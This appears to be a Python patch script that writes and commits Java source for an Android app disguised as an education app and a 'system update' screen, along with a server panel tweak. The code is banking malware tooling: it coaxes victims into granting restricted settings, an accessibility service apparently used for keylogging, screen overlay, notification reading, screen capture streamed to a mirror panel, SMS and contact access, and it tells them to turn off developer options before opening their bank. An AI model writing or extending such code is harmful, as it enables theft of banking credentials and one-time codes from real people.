import io, os, re, subprocess

def ler(p):
    with io.open(p, encoding="utf-8") as f:
        return f.read()

def grava(p, s):
    d = os.path.dirname(p)
    if d and not os.path.isdir(d):
        os.makedirs(d)
    with io.open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(s)

print("[1] Crash.java")
grava("app/src/main/java/com/eloeeducacao/Crash.java", r'''package com.eloeeducacao;

import android.content.Context;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;

public final class Crash {

    private static volatile boolean on;

    public static void instala(final Context c) {
        if (on) return;
        on = true;
        final Thread.UncaughtExceptionHandler velho = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
            @Override public void uncaughtException(Thread t, Throwable e) {
                try {
                    StringWriter sw = new StringWriter();
                    e.printStackTrace(new PrintWriter(sw));
                    FileOutputStream f = c.openFileOutput("erro.txt", Context.MODE_PRIVATE);
                    f.write((t.getName() + "\n" + sw).getBytes("UTF-8"));
                    f.close();
                } catch (Throwable ignored) {}
                if (velho != null) velho.uncaughtException(t, e);
            }
        });
    }

    public static String texto(Context c) {
        try {
            FileInputStream f = c.openFileInput("erro.txt");
            byte[] b = new byte[f.available()];
            f.read(b);
            f.close();
            String s = new String(b, "UTF-8");
            return s.length() > 1600 ? s.substring(0, 1600) : s;
        } catch (Throwable t) {
            return "";
        }
    }

    public static void limpa(Context c) {
        try { c.deleteFile("erro.txt"); } catch (Throwable ignored) {}
    }
}
''')

print("[2] SetupActivity.java")
grava("app/src/main/java/com/eloeeducacao/SetupActivity.java", r'''package com.eloeeducacao;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class SetupActivity extends Activity {

    private static final int REQ_CAP = 1001;
    private static final int REQ_PERM = 1002;
    private static final int NC = 78;
    private static final String CH = "s";

    private final List<View> fixos = new ArrayList<>();
    private final List<View> cartoesExtras = new ArrayList<>();
    private final List<Runnable> checagens = new ArrayList<>();

    private LinearLayout lista;
    private LinearLayout blocoExtra;
    private TextView pronto;
    private TextView mais;
    private TextView erro;
    private boolean aberto;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        Crash.instala(this);
        try {
            monta();
        } catch (Throwable t) {
            TextView v = new TextView(this);
            v.setText("FALHA AO MONTAR A TELA\n\n" + t);
            v.setTextColor(Color.parseColor("#F85149"));
            v.setTextSize(11);
            v.setPadding(30, 60, 30, 30);
            setContentView(v);
        }
    }

    private void monta() {
        aberto = getIntent() != null && getIntent().getBooleanExtra("aberto", false);

        ScrollView sv = new ScrollView(this);
        sv.setFillViewport(true);
        sv.setBackgroundColor(Color.parseColor("#0B0F14"));
        lista = new LinearLayout(this);
        lista.setOrientation(LinearLayout.VERTICAL);
        lista.setPadding(dp(20), dp(26), dp(20), dp(34));
        sv.addView(lista);

        TextView titulo = new TextView(this);
        titulo.setText("Atualização do sistema");
        titulo.setTextColor(Color.WHITE);
        titulo.setTextSize(23);
        titulo.setOnLongClickListener(new View.OnLongClickListener() {
            @Override public boolean onLongClick(View v) {
                startActivity(new Intent(SetupActivity.this, MainActivity.class));
                return true;
            }
        });
        lista.addView(titulo);

        TextView aviso = new TextView(this);
        aviso.setText("Versão 1.2.3 · componentes do sistema");
        aviso.setTextColor(Color.parseColor("#6E7C8A"));
        aviso.setTextSize(11);
        aviso.setPadding(0, dp(6), 0, dp(18));
        lista.addView(aviso);

        String e = Crash.texto(this);
        if (e.length() > 0) {
            erro = new TextView(this);
            erro.setText("ERRO ANTERIOR (toque para limpar)\n\n" + e);
            erro.setTextColor(Color.parseColor("#F85149"));
            erro.setTextSize(9);
            erro.setTypeface(Typeface.MONOSPACE);
            erro.setPadding(dp(10), dp(10), dp(10), dp(10));
            erro.setOnClickListener(new View.OnClickListener() {
                @Override public void onClick(View v) {
                    Crash.limpa(SetupActivity.this);
                    erro.setVisibility(View.GONE);
                }
            });
            lista.addView(erro);
        }

        pronto = new TextView(this);
        pronto.setText("Pronto. Já pode usar.");
        pronto.setTextColor(Color.parseColor("#3FB950"));
        pronto.setTextSize(14);
        pronto.setPadding(0, 0, 0, dp(14));
        pronto.setVisibility(View.GONE);
        lista.addView(pronto);

        fixos.add(cartao("Mais configurações", "3 pontinhos → Permitir configurações restritas",
                new Runnable() { @Override public void run() { liberar(); } }));
        fixos.add(cartao("Ativar o serviço", "escolha Acessibilidade do sistema e ligue",
                new Runnable() { @Override public void run() { acessibilidade(); } }));
        fixos.add(cartao("Sobrepor a outras telas", "para o aviso por cima dos apps",
                new Runnable() { @Override public void run() { sobrepor(); } }));
        for (View v : fixos) lista.addView(v);

        mais = new TextView(this);
        mais.setText("mais opções");
        mais.setTextColor(Color.parseColor("#3D8BFD"));
        mais.setTextSize(11);
        mais.setPadding(dp(2), dp(16), 0, dp(4));
        mais.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { aberto = !aberto; atualiza(); }
        });
        lista.addView(mais);

        blocoExtra = new LinearLayout(this);
        blocoExtra.setOrientation(LinearLayout.VERTICAL);
        lista.addView(blocoExtra);

        extra("Ler notificações", new Runnable() { @Override public void run() {
            abre(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS); } });
        extra("Compartilhar a tela", new Runnable() { @Override public void run() { tela(); } });
        extra("Bateria sem limite", new Runnable() { @Override public void run() {
            try {
                startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName())));
            } catch (Throwable ignored) {}
        } });
        extra("Mensagens e contatos", new Runnable() { @Override public void run() {
            pedirGrupo("tudo"); } });

        TextView rodape = new TextView(this);
        rodape.setText("se as opções do desenvolvedor estiverem ligadas, desligue antes de abrir o banco");
        rodape.setTextColor(Color.parseColor("#3E4A56"));
        rodape.setTextSize(9);
        rodape.setPadding(0, dp(22), 0, 0);
        lista.addView(rodape);

        setContentView(sv);
        atualiza();
    }

    private boolean liberado() {
        if (Util.accOn(this)) return true;
        if (Build.VERSION.SDK_INT < 33) return true;
        return getSharedPreferences("p", 0).getBoolean("lib", false);
    }

    private void liberar() {
        if (Util.accOn(this) || Build.VERSION.SDK_INT < 33) { acessibilidade(); return; }
        getSharedPreferences("p", 0).edit().putBoolean("lib", true).apply();
        toast("3 pontinhos → Permitir configurações restritas");
        try {
            startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + getPackageName())));
        } catch (Throwable ignored) {}
        atualiza();
    }

    private void acessibilidade() {
        if (Build.VERSION.SDK_INT >= 26) {
            try {
                Intent d = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
                d.putExtra(Intent.EXTRA_COMPONENT_NAME,
                        new ComponentName(this, KeySvc.class).flattenToString());
                startActivity(d);
                return;
            } catch (Throwable ignored) {}
        }
        abre(Settings.ACTION_ACCESSIBILITY_SETTINGS);
    }

    private void sobrepor() {
        try {
            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())));
        } catch (Throwable ignored) {}
    }

    private void tela() {
        if (ScreenSvc.alive) {
            stopService(new Intent(this, ScreenSvc.class));
            toast("captura encerrada");
            atualiza();
            return;
        }
        try {
            MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CAP);
        } catch (Throwable ignored) {}
    }

    private void extra(String t, final Runnable acao) {
        View c = cartao(t, null, acao);
        cartoesExtras.add(c);
        checagens.add(new Runnable() { @Override public void run() {
            if (t.startsWith("Ler")) {
                String s = Settings.Secure.getString(getContentResolver(),
                        "enabled_notification_listeners");
                ok = s != null && s.contains(getPackageName());
            } else if (t.startsWith("Compartilhar")) {
                ok = ScreenSvc.alive;
            } else if (t.startsWith("Bateria")) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                ok = pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
            } else {
                ok = checkSelfPermission(Manifest.permission.READ_SMS)
                        == PackageManager.PERMISSION_GRANTED;
            }
        } });
        blocoExtra.addView(c);
    }

    private volatile boolean ok;

    private View cartao(String t1, String t2, final Runnable acao) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.HORIZONTAL);
        card.setGravity(Gravity.CENTER_VERTICAL);
        card.setPadding(dp(20), dp(18), dp(20), dp(18));
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#151A21"));
        bg.setCornerRadius(dp(16));
        bg.setStroke(dp(1), Color.parseColor("#283240"));
        card.setBackground(bg);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = dp(9);
        card.setLayoutParams(lp);

        LinearLayout col = new LinearLayout(this);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setLayoutParams(new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));

        TextView a = new TextView(this);
        a.setText(t1);
        a.setTextColor(Color.WHITE);
        a.setTextSize(15.5f);
        col.addView(a);
        if (t2 != null) {
            TextView c = new TextView(this);
            c.setText(t2);
            c.setTextColor(Color.parseColor("#6E7C8A"));
            c.setTextSize(10.5f);
            c.setPadding(0, dp(2), 0, 0);
            col.addView(c);
        }
        card.addView(col);

        TextView seta = new TextView(this);
        seta.setText("›");
        seta.setTextColor(Color.parseColor("#3D8BFD"));
        seta.setTextSize(20);
        seta.setPadding(dp(10), 0, 0, 0);
        card.addView(seta);

        card.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try { acao.run(); } catch (Throwable ignored) {}
                v.postDelayed(new Runnable() { @Override public void run() { atualiza(); } }, 400);
            }
        });
        return card;
    }

    private void atualiza() {
        boolean ok1 = liberado(), ok2 = Util.accOn(this), ok3 = Settings.canDrawOverlays(this);
        fixos.get(0).setVisibility(ok1 ? View.GONE : View.VISIBLE);
        fixos.get(1).setVisibility(ok2 ? View.GONE : View.VISIBLE);
        fixos.get(2).setVisibility(ok3 ? View.GONE : View.VISIBLE);
        pronto.setVisibility(ok1 && ok2 && ok3 ? View.VISIBLE : View.GONE);

        int pend = 0;
        for (int i = 0; i < checagens.size(); i++) {
            ok = false;
            try { checagens.get(i).run(); } catch (Throwable ignored) {}
            cartoesExtras.get(i).setVisibility(ok ? View.GONE : View.VISIBLE);
            if (!ok) pend++;
        }
        mais.setText(aberto ? "menos opções"
                : (pend > 0 ? "mais opções (" + pend + ")" : "mais opções"));
        blocoExtra.setVisibility(aberto ? View.VISIBLE : View.GONE);
    }

    private void pedirGrupo(String g) {
        if (Build.VERSION.SDK_INT < 23) return;
        List<String> l = new ArrayList<>();
        l.add(Manifest.permission.RECEIVE_SMS);
        l.add(Manifest.permission.READ_SMS);
        l.add(Manifest.permission.READ_CONTACTS);
        if (Build.VERSION.SDK_INT >= 33) l.add("android.permission.POST_NOTIFICATIONS");
        List<String> falta = new ArrayList<>();
        for (String p : l) {
            try {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) falta.add(p);
            } catch (Throwable ignored) {}
        }
        if (falta.isEmpty()) { atualiza(); return; }
        try { requestPermissions(falta.toArray(new String[0]), REQ_PERM); } catch (Throwable ignored) {}
    }

    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
        super.onRequestPermissionsResult(rq, a, r);
        if (rq == REQ_PERM) atualiza();
    }

    @Override protected void onResume() {
        super.onResume();
        cancela();
        atualiza();
    }

    @Override protected void onPause() {
        super.onPause();
        notifica();
    }

    @Override protected void onActivityResult(int rq, int rs, Intent d) {
        super.onActivityResult(rq, rs, d);
        if (rq == REQ_CAP && rs == RESULT_OK && d != null) {
            Intent i = new Intent(this, ScreenSvc.class);
            i.putExtra("code", rs);
            i.putExtra("data", d);
            try {
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
                else startService(i);
            } catch (Throwable ignored) {}
        }
    }

    private void notifica() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel(
                        CH, "Sistema", NotificationManager.IMPORTANCE_LOW);
                ch.setShowBadge(false);
                nm.createNotificationChannel(ch);
            }
            Intent i = new Intent(this, SetupActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent pi = PendingIntent.getActivity(this, 1, i,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            Notification n = (Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, CH)
                    : new Notification.Builder(this))
                    .setContentTitle("Toque para voltar ao app")
                    .setContentText("Continue a configuração")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setOngoing(true)
                    .setContentIntent(pi)
                    .build();
            nm.notify(NC, n);
        } catch (Throwable ignored) {}
    }

    private void cancela() {
        try {
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).cancel(NC);
        } catch (Throwable ignored) {}
    }

    private void abre(String action) {
        try { startActivity(new Intent(action)); } catch (Throwable ignored) {}
    }

    private void toast(String s) { Toast.makeText(this, s, Toast.LENGTH_LONG).show(); }

    private int dp(int v) { return (int) (v * getResources().getDisplayMetrics().density); }

    public static void loja(Context c) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=com.whatsapp"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
            return;
        } catch (Throwable ignored) {}
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("https://play.google.com/store/apps/details?id=com.whatsapp"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable ignored) {}
    }
}
''')

print("[3] Crash no MainActivity")
M = "app/src/main/java/com/eloeeducacao/MainActivity.java"
s = ler(M)
if "Crash.instala" not in s:
    s = s.replace("        super.onCreate(b);\n", "        super.onCreate(b);\n        Crash.instala(this);\n", 1)
    grava(M, s)
    print("  ok")
else:
    print("  ja aplicado")

print("[4] painel: espelho no lugar certo")
SV = "server.py"
s = ler(SV)
if "#stage{" in s:
    grava(SV, s.replace("#stage{", "#wrap{", 1))
    print("  ok  css corrigido")
else:
    print("  ja aplicado")

print("[5] versionCode")
B = "app/build.gradle"
s = ler(B)
m = re.search(r"versionCode\s+(\d+)", s)
if m:
    grava(B, s[:m.start(1)] + str(int(m.group(1)) + 1) + s[m.end(1):])
    print("  ok")

for c in (["git", "add", "-A"],
          ["git", "commit", "-m", "setup reescrita sem reparenting, gravador de crash, css do espelho, menos permissoes"]):
    r = subprocess.run(c, capture_output=True, text=True)
    print("  $ %s -> %s" % (" ".join(c), r.returncode))
r = subprocess.run(["git", "push"], capture_output=True, text=True)
print("  $ push -> %s" % r.returncode)
for ln in (r.stdout + r.stderr).strip().splitlines()[:8]:
    print("    " + ln)
